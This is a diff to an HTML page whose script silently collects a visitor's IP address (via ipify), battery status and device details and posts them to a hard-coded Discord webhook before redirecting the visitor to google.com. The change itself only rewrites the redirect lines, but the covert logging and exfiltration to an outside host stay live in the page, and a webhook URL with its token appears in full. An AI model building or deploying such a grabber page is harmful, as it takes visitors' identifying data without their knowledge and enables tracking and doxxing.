@@ -11,9 +11,9 @@
         // Replace with your Discord webhook URL
         const webhookURL = 'https://discord.com/api/webhooks/1306241739346018404/r_uDL2KtEA2RJ9X2NwsATtD_5IC_R-GZ2FsyP5ljOFNjd9SUxbQuzpzWeWfPq8pyemi5';
 
-      // URL to redirect after logging the information
-    const redirectURL = 'https://www.google.com'; // Use full URL with https://
+   const redirectURL = 'https://www.google.com'; // Full URL with https://
 
+        
         // Function to get IP address
         function getIPAddress() {
             return fetch('https://api.ipify.org?format=json')
@@ -100,11 +100,11 @@
                 sendToDiscord(ip, battery, deviceInfo);
             })
   
-    // Redirect logic
-    .finally(() => {
-        // Redirect to the specified URL after logging the information
-        window.location.href = redirectURL;
-    });
+// Redirect logic
+.finally(() => {
+    // Force absolute URL by explicitly setting window.location
+    window.location.assign(redirectURL);
+});
 </script>
 </body>
 </html>
